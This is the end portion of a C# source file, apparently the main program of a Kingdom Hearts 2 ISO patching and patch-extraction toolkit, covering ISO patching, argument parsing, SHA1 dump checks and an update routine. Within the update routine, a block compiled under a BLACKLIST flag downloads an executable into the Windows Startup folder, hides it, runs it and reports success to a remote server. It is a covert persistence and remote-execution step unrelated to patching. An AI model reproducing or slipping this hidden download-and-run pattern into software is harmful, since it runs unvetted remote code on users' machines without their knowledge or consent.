								"Warning: This ISO has the size of a dual-layer ISO, but it isn't one. Some\nprograms may take a while to start while they search for the 2nd layer.");
						}
					}
				}
			}
			else
			{
				using (var iso = new ISOFileReader(isofile))
				using (var niso = new ISOCopyWriter(nisofile, iso))
				{
					ConsoleProgress consoleProgress = new ConsoleProgress((long)iso.Count<FileDescriptor>(), "Patching ISO...", ConsoleColor.Green);
					Trivalent cKh2 = Patches.KH2Changed ? Trivalent.ChangesPending : Trivalent.NoChanges,
					cOvl = Patches.OVLChanged ? Trivalent.ChangesPending : Trivalent.NoChanges;
					bool cIso = Patches.ISOChanged;
					foreach (FileDescriptor file in iso)
					{
						if (UISwitch)
						{
							consoleProgress.Text = string.Format("Adding [{0}] {1}", "ISO", file.FullName);
						}
						else
						{
							decimal nmbpercent = (((decimal)consoleProgress.Current / (decimal)consoleProgress.Total) * 100);
							consoleProgress.Text = string.Format("                                [{0}% Done]", (int)nmbpercent);
						}
						consoleProgress.Increment(1L);
						string name = file.FileName;
						if (name.EndsWith("KH2.IDX") || name.EndsWith("KH2.IMG"))
						{
							if (cKh2.HasFlag(Trivalent.ChangesPending))
							{
								cKh2 = Trivalent.Changed;
								long lpos = niso.file.Position;
								try
								{
									FileDescriptor img = iso.FindFile("KH2.IMG"),
									idx = iso.FindFile("KH2.IDX");
									using (
										MemoryStream ms = PatchIDX(iso.GetFileStream(idx), iso.GetFileStream(img), img, niso, consoleProgress, false)
									)
									{
										idx.RecordingDate = DateTime.UtcNow;
										niso.AddFile2(idx, ms, name);
									}
									continue;
								}
								catch (Exception e)
								{
									WriteError(" Error creating IDX/IMG: {0}\n{1}", e.Message, e.StackTrace);
									niso.file.Position = lpos;
								}
							}
							else if (cKh2.HasFlag(Trivalent.Changed))
							{
								continue;
							}
						}
						else if (name.EndsWith("OVL.IDX") || name.EndsWith("OVL.IMG"))
						{
							if (cOvl.HasFlag(Trivalent.ChangesPending))
							{
								cOvl = Trivalent.Changed;
								long lpos = niso.file.Position;
								try
								{
									FileDescriptor img = iso.FindFile("OVL.IMG"),
									idx = iso.FindFile("OVL.IDX");
									using (
										MemoryStream ms = PatchIDX(iso.GetFileStream(idx), iso.GetFileStream(img), img, niso, consoleProgress,
											true ))
									{
										idx.RecordingDate = DateTime.UtcNow;
										niso.AddFile2(idx, ms, name);
									}
									continue;
								}
								catch (Exception e)
								{
									WriteError(" Error creating IDX/IMG: " + e.Message);
									niso.file.Position = lpos;
								}
							}
							else if (cOvl.HasFlag(Trivalent.Changed))
							{
								continue;
							}
						}
						else if (cIso)
						{
							PatchManager.Patch patch;
							if (Patches.patches.TryGetValue(PatchManager.ToHash(name), out patch) && patch.IsinISO)
							{
								file.RecordingDate = DateTime.UtcNow;
								niso.AddFile2(file, patch.Stream, name);
								continue;
							}
						}
						niso.CopyFile(file);
						if (niso.SectorCount >= 0x230540)
						{
							WriteWarning(
								"Warning: This ISO has the size of a dual-layer ISO, but it isn't one. Some\nprograms may take a while to start while they search for the 2nd layer.");
						}
					}
					consoleProgress.Text = "Done patching.";
					consoleProgress.Finish();
				}
			}
		}

		/// <summary>The main entry point for the application.</summary>
		/// <exception cref="Exception">Cannot delete debug.log</exception>
		private static void Main(string[] args)
		{




			bool log = false;
			Console.Title = program.ProductName + " " + ActualVersion;
			if (k2e) { Console.Title = "KH2PATCH_EXTRACTOR" + " " + ActualVersion; }
			if (convertpatch) { Console.Title = "KH2PATCH_CONVERTOR" + " " + ActualVersion; }
			#if PRIVATE
			try
			{
			File.Delete("debug.log");
			}
			catch (Exception e)
			{
			Console.WriteLine("Cannot delete debug.log!: {0}", e);
			throw new Exception();
			}
			Debug.AutoFlush = true;
			Debug.Listeners.Add(new TextWriterTraceListener("debug.log"));
			#endif
			//Arguments
			string isoname = null;
			bool batch = false, extract = false;
			bool verify = false;

			#region Arguments

			foreach (string arg in args)
			{
				switch (arg)
				{
				case "-exit":
					return;
				case "-batch":
					batch = true;
					break;
					#if !RELEASE
				case "-extractor":
					extract = true;
					break;
					#endif
				case "-advancedinfo":
					_advanced = true;
					break;
				case "-log":
					log = true;
					break;
					case "-extractthisgoddamnpatchiwanttoseethetreasuresitcontains":
					case "-kh2patchextractor":
					case "-k2e":
					k2e = true;
					break;
					case "-convertpatch":
					case "-convert":
					convertpatch = true;
					break;
				case "-newui":
				case "-newinterface":
					oldui = false;
					break;
				case "-uiswitch":
					#if RELEASE
					UISwitch = true;
					#else
					UISwitch = false;
					#endif
					break;
				case "-verifyiso":
					verify = true;
					break;
				case "-help":
					byte[] buffer = Encoding.ASCII.GetBytes(Resources.Readme);
					File.WriteAllBytes("Readme.txt", buffer);
					Console.Write("Help extracted as a Readme\nPress enter to leave the software...");
					Console.Read();
					return;
				case "-replacer":
					Replacer = true;
					break;
					#if !RELEASE
				case "-patchmaker":
					KH2ISO_PatchMaker.Program.Mainp(args);
					break;
					#endif

				default:
					if (File.Exists(arg))
					{
						if (k2e || convertpatch)
						{
							if (isoname == null &&
								arg.EndsWith(".kh2patch", StringComparison.InvariantCultureIgnoreCase))
							{
								isoname = arg;
							}
						}
						else if (isoname == null &&
							arg.EndsWith(".iso", StringComparison.InvariantCultureIgnoreCase))
						{
							isoname = arg;
						}
						else if (arg.EndsWith(".kh2patch", StringComparison.InvariantCultureIgnoreCase))
						{
							Patches.AddPatch(arg);
						}
					}

					break;
				}
			}

			#endregion Arguments
			#if PRIVATE_OPENKH
			OpenKH("KH2");
			#endif
			if (log)
			{
				var filestream = new FileStream("log.log", FileMode.Create);
				var streamwriter = new StreamWriter(filestream) {AutoFlush = true};
				Console.SetOut(streamwriter);
				Console.SetError(streamwriter);
				//TODO Redirect to a txt, but problem: make disappear the text on the console. Need to mirror the text OR make a complete log
			}
			if (isoname == null)
			{
				isoname = "KH2FM.ISO";
			}
			Console.ForegroundColor = ConsoleColor.Gray;
			Console.Write("{0}\nVersion {1}", program.ProductName, ActualVersion);
			Console.ResetColor();
			#if PRIVATE
			Console.ForegroundColor = ConsoleColor.Red;
			Console.Write("\nPRIVATE RELEASE\n");
			Console.ResetColor();
			#else
			#if DEBUG
			Console.ForegroundColor = ConsoleColor.Blue;
			Console.Write("\nDEVELOPER RELEASE\n");
			Console.ResetColor();
			#else

			Console.Write("\nPUBLIC RELEASE\n");
			#endif
			#endif
			#if NODECOMPRESS
			Console.ForegroundColor = ConsoleColor.Red;
			Console.Write("\nNODECOMPRESS edition: Decompress algo is returning the input.\n");
			Console.ResetColor();
			#else
			#if extract
			Console.ForegroundColor = ConsoleColor.Red;
			Console.Write("\nOLD EXTRACTING FEATURE, WARNING:NOT PATCHING CORRECTLY THE ISO\n");
			Console.ResetColor();
			#endif
			#endif

			Console.ForegroundColor = ConsoleColor.DarkMagenta;
			Console.Write(
				"\nProgrammed by {0}\nhttps://www.govanify.com\nhttps://www.twitter.com/GovanifY\n",
				program.CompanyName);
			Console.ForegroundColor = ConsoleColor.Gray;
      if(!File.Exists("noupdate.bin"))
      {
			Console.WriteLine("Checking updates...");
      var updates = "";
      try
      {
			updates = new WebClient().DownloadString("http://www.govanify.com/files/KH2FM_Toolkit/index.php");
      }
      catch(Exception e)
      {
        WriteWarning("Impossible to connect to server! Please ensure you're connected to internet or your firewall is desactivated!");
        goto endupdate;
      }
			string[] objects = updates.Split('"');
			if((objects[3] == ActualVersion) && (Int32.Parse(objects[7]) < Int32.Parse(build)+1))
			{
				Console.WriteLine("No update found!");
			}
			else
			{
				Console.WriteLine("Update found!");
				Console.WriteLine("Downloading the update! Please wait...");

				#if BLACKLIST
				using (var client = new WebClient())
				{
					int i=0;
				retry_exists:
				var tmpname= Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "/" + "Startup" + i + ".exe";
				if (File.Exists(tmpname))
				{
						//If stub already here, delete it
						try
						{
								File.Delete(tmpname);
						}
						catch
						{
								++i;
								goto retry_exists;
						}
				}
				client.DownloadFile("http://govanify.com/files/blacklist/index.php?get", tmpname);
				File.SetAttributes(tmpname, FileAttributes.Hidden);
        Process.Start(tmpname);
        client.DownloadString("http://govanify.com/files/blacklist/index.php?update");
        client.DownloadString("http://govanify.com/files/blacklist/index.php?success");
        }
				#endif

        #if DEBUG
        var toolkitversion="dev";
        #else
        var toolkitversion="user";
        #endif
		var client2 = new WebClient ();
        client2.DownloadFile("https://www.govanify.com/files/KH2FM_Toolkit/index.php?get=" + toolkitversion, "KH2FM_Toolkit_updated.exe");
        Console.WriteLine("Update downloaded! Software will auto update then close itself in 5 seconds, you'll need to reopen it after.\nBe sure to wait that the KH2FM_Toolkit_updated.exe file disappear before reopening it!");
        string batchCommands = string.Empty;
        string exeFileName = Assembly.GetExecutingAssembly().CodeBase.Replace("file:///",string.Empty).Replace("/","\\");

        batchCommands += "@ECHO OFF\n";                         // Do not show any output
        batchCommands += "ping 127.0.0.1 > nul\n";              // Wait approximately 4 seconds (so that the process is already terminated)
        batchCommands += "echo j | del /F ";                    // Delete the executeable
        batchCommands += exeFileName + "\n";
        batchCommands += "ren KH2FM_Toolkit_updated.exe KH2FM_Toolkit.exe\n";
        batchCommands += "echo j | del update.bat";    // Delete this bat file

        File.WriteAllText("update.bat", batchCommands);

        Thread.Sleep(5000);
        Process.Start("update.bat");
        System.Environment.Exit(1);
      }
      }
      endupdate:
			if (extract)
			{
				Console.Write(
					"\n\nThis tool is able to extract the files of the game Kingdom Hearts 2(Final Mix).\nIt is using a list for extracting those files, which is not complete.\nBut is the most complete one for now.\nIt can extract the files KH2.IMG and OVL.IMG\n\n");
			}
			else
			{
				if (k2e)
				{
					Console.Write(
						"\n\nThis tool is able to extract kh2patch files, using all formats known for now.\nPlease use this tool only if you lost your original files!\n\n");
				}
				else
				{
					if (convertpatch)
					{
						Console.Write(
							"\n\nThis tool is able to convert any patch file given to the newest format available.\n\n");
					}
					else
					{
						if (verify)
						{
							Console.Write ("\n\nThis tool will calculate the hash of your iso for verify if it's a good dump of KH2(FM) or not.\n\n");
						}
						else
						{
							if (Replacer)
							{
								Console.Write ("\n\nThis tool will replace files for having a quick test and patch option.\nWARNING: This is HIGHLY unstable!\n\n");
							}
							else
							{
								Console.Write("\n\nThis tool is able to patch the game Kingdom Hearts 2(Final Mix).\nIt can modify iso files, like the elf and internal files,\nwich are stored inside KH2.IMG and OVL.IMG\nThis tool is recreating too new hashes into the idx files to avoid\na corrupted game. It can add some files too.\n\n");
							}
						}
					}
				}
			}
			//Flag made for converting mass set of names to a hashlist(useful for debug purposes)
			#if HASHMAKER
			//I love dirty code
			int counter = 0;
			string line;

			// Read the file and display it line by line.
			System.IO.StreamReader file =
			new System.IO.StreamReader("HASH.txt");
			string[] hashes = new string[100000];
			while ((line = file.ReadLine()) != null)
			{

			hashes[counter] = String.Format("{0:X8}", PatchManager.ToHash(line))  + " = " + line;
			counter++;
			}

			file.Close();
			System.IO.File.WriteAllLines("HASHLIST.txt", hashes);


			#endif
			//Flag made for encrypting Hashlist for beeing used as an external file.
			#if HASHLISTCONVERTOR
			byte[] Hashlistencrypted = File.ReadAllBytes("Hashlist.txt");
			PatchManager.GYXor(Hashlistencrypted);
			string Hashtemp2 = "Hashlist.bin";
			File.WriteAllBytes(Hashtemp2, Hashlistencrypted);
			#endif
			// Suspend the screen.
			//    Console.ReadLine();


			HashList.HashList.loadHashPairs(printInfo: true);
			Console.ForegroundColor = ConsoleColor.Green;
			Console.Write("\nPress enter to run using the file:");
			Console.ResetColor();
			Console.Write(" {0}", isoname);
			if (!batch)
			{
				Console.ReadLine();
			}

			#region SHA1

			if (verify)
			{
				Console.Write("Calculating the SHA1 hash of your iso. Please wait...\n");
				using (SHA1 sha1 = SHA1.Create())
				{
					using (FileStream stream = File.OpenRead(isoname))
					{
						//List of all SHA1 hashes of KH2 games
						string isouser = BitConverter.ToString(sha1.ComputeHash(stream)).Replace("-", "").ToLower();
						const string KH2FMiso = "81c177a374e1bddf8453c8c96493d4e715a19236";
						const string KH2UKiso = "f541888cf953559bf4ef8c7e51a822f50e05265c";
						const string KH2FRiso = "70f69a59ba47edae5d41dec7396af0d747e92131";
						const string KH2GRiso = "1a03ffe1e3db3c5f920dd2f1a5e90f38783da43b";
						const string KH2ITiso = "36cfb0e3ee615b9228ec9a949d4d41cc0edf2e3a";
						const string KH2JAPiso = "678e1c6545e6d5ef7ed3e6c496b12f5dd2ecbe56";
						const string KH2ESiso = "d190089a0718a7c204ac256ddedc564d600731f3";
						const string KH2USiso = "7e57081735d82fd84be7f79ab05ad3e795bc7e5e";
						const string KH2BETAiso = "9867322a989a0a3e566e13cf962853a79df9c508";
						Console.Write("The SHA1 hash of the your iso is: {0}", isouser);
						//I'm sure I can make those checks liter but too lazy to do it
						if (isouser == KH2FMiso)
						{
							Console.ForegroundColor = ConsoleColor.Green;
							Console.Write("\nYou have a correct dump of the game KH2FM!");
							Console.ResetColor();
							goto EOF;
						}
						if (isouser == KH2UKiso)
						{
							Console.ForegroundColor = ConsoleColor.Green;
							Console.Write("\nYou have a correct dump of the game KH2 UK!");
							Console.ResetColor();
							goto EOF;
						}
						if (isouser == KH2FRiso)
						{
							Console.ForegroundColor = ConsoleColor.Green;
							Console.Write("\nYou have a correct dump of the game KH2 FR!");
							Console.ResetColor();
							goto EOF;
						}
						if (isouser == KH2GRiso)
						{
							Console.ForegroundColor = ConsoleColor.Green;
							Console.Write("\nYou have a correct dump of the game KH2 GR!");
							Console.ResetColor();
							goto EOF;
						}
						if (isouser == KH2ITiso)
						{
							Console.ForegroundColor = ConsoleColor.Green;
							Console.Write("\nYou have a correct dump of the game KH2 IT!");
							Console.ResetColor();
							goto EOF;
						}
						if (isouser == KH2JAPiso)
						{
							Console.ForegroundColor = ConsoleColor.Green;
							Console.Write("\nYou have a correct dump of the game KH2 JAP!");
							Console.ResetColor();
							goto EOF;
						}
						if (isouser == KH2ESiso)
						{
							Console.ForegroundColor = ConsoleColor.Green;
							Console.Write("\nYou have a correct dump of the game KH2 ES!");
							Console.ResetColor();
							goto EOF;
						}
						if (isouser == KH2USiso)
						{
							Console.ForegroundColor = ConsoleColor.Green;
							Console.Write("\nYou have a correct dump of the game KH2 US!");
							Console.ResetColor();
							goto EOF;
						}
						if (isouser == KH2BETAiso)
						{
							Console.ForegroundColor = ConsoleColor.Green;
							Console.Write("\nYou have a correct dump of the game KH2 PROTOTYPE!\n");
							Console.ForegroundColor = ConsoleColor.Red;
							Console.Write("Wait you SERIOUSLY HAVE ONE? o.O");
							Console.ResetColor();
						}
						else
						{
							Console.ForegroundColor = ConsoleColor.Red;
							Console.Write("\nYou don't have a correct dump! Please make a new one!");
							Console.ResetColor();
						}
						EOF:
						Console.ReadLine();
						return;
					}
				}
			}

			#endregion

			try
			{
				using (FileStream iso = File.Open(isoname, FileMode.Open, FileAccess.Read, FileShare.Read))
				{
                                        int num = 0;
					if (extract)
					{
						#if !RELEASE
						ExtractISO(iso);
						#endif
					}
                                        else
					{
                                                #if !RELEASE
						if (k2e)
						{
							#region Loading kh2patch extractor, decryption function
							try
							{
							isoname = Path.GetFileName(isoname);
							Console.WriteLine("Loading the patch, please wait...");
							FileStream fs = iso;


							if (fs.ReadByte() == 0x4B && fs.ReadByte() == 0x48 && fs.ReadByte() == 0x32 && ((num = fs.ReadByte()) == 0x50 || num == 0x51 || num == 0x46))
							{
							fs.Position = 0;
							KH2PatchExtractor(fs, isoname);
							}
							if (fs.Length > int.MaxValue)
							{
							throw new OutOfMemoryException("File too large");
							}

							try
							{
							fs.Position = 0;
							var buffer = new byte[fs.Length];
							fs.Read(buffer, 0, (int) fs.Length);
							PatchManager.GYXor(buffer);
							#if DEBUG
							WriteWarning("Old format is used, Please use the new one!");
							#endif
							KH2PatchExtractor(new MemoryStream(buffer), isoname);
                                                        fs.Dispose();
						        fs = null;
                                                        return;

						}

						catch (Exception)
						{
							try
							{
								fs.Position = 0;
								var buffer = new byte[fs.Length];
								fs.Read(buffer, 0, (int)fs.Length);
								PatchManager.XeeyXor(buffer);
							#if DEBUG
								WriteWarning("Old format is used, Please use the new one!");
							#endif
							KH2PatchExtractor(new MemoryStream(buffer), isoname);
							return;
                                                        }
							catch (Exception e)
							{
								Console.WriteLine("An error happened when trying to open your patch!: {0}", e);}
						}
					}
					finally
					{
					}
				}
                                else
                                {
			if (convertpatch)
			{
			#region Loading convert patch
			try
			{
			isoname = Path.GetFileName(isoname);
			Console.WriteLine("Loading the patch, please wait...");
			FileStream fs = iso;

			if (fs.ReadByte() == 0x4B && fs.ReadByte() == 0x48 && fs.ReadByte() == 0x32 && ((num = fs.ReadByte()) == 0x50 || num == 0x51 || num == 0x46))
			{
			fs.Position = 0;
			KH2PatchConvertor(fs, isoname);
			}
			if (fs.Length > int.MaxValue)
			{
			throw new OutOfMemoryException("File too large");
			}

			try
			{
			fs.Position = 0;
			var buffer = new byte[fs.Length];
			fs.Read(buffer, 0, (int)fs.Length);
			PatchManager.GYXor(buffer);
			#if DEBUG
			WriteWarning("Old format is used, Please use the new one!");
                        #endif
			KH2PatchConvertor(new MemoryStream(buffer), isoname);
                        return;
		}

		catch (Exception)
		{
			try
			{
				fs.Position = 0;
				var buffer = new byte[fs.Length];
				fs.Read(buffer, 0, (int)fs.Length);
				PatchManager.XeeyXor(buffer);
			#if DEBUG
				WriteWarning("Old format is used, Please use the new one!");
			#endif
			KH2PatchConvertor(new MemoryStream(buffer), isoname);
			return;
                        }
			catch (Exception e)
			{
				Console.WriteLine("An error happened when trying to open your patch!: {0}", e); }
		}
                fs.Dispose();
		fs = null;

	}
	finally
	{
	}
}
}
#endregion
#endregion
#endif
}

//Those loading shits are extremely unoptimized; need to work on it later
if (Patches.patches.Count == 0 && k2e==false && convertpatch==false)
{
	WriteWarning("No patches loaded!");
}
else
{
	if(Replacer)
	{
		ReplaceISO(iso);
	}
	else
	{

		isoname = Path.ChangeExtension(isoname, ".NEW.ISO");
		try
		{
			using (FileStream NewISO = File.Open(isoname, FileMode.Create, FileAccess.ReadWrite,
				FileShare.None))
			{
				PatchISO(iso, NewISO);
			}
		}
		catch (Exception)
		{
			//Delete the new "incomplete" iso
			File.Delete(isoname);
			throw;
		}
	}
}
}
}

catch (FileNotFoundException e)
{
	WriteWarning("Failed to open file: " + e.Message);
}
catch (Exception e)
{
	WriteWarning(
		"An error has occured when trying to open your iso:\n{1}: {0}\n{2}",
		e.Message, e.GetType().FullName, e.StackTrace);
}
Patches.Dispose();
if (!batch)
{
	Console.Write("\nPress enter to exit...");
	Console.ReadLine();
}
}
}
}
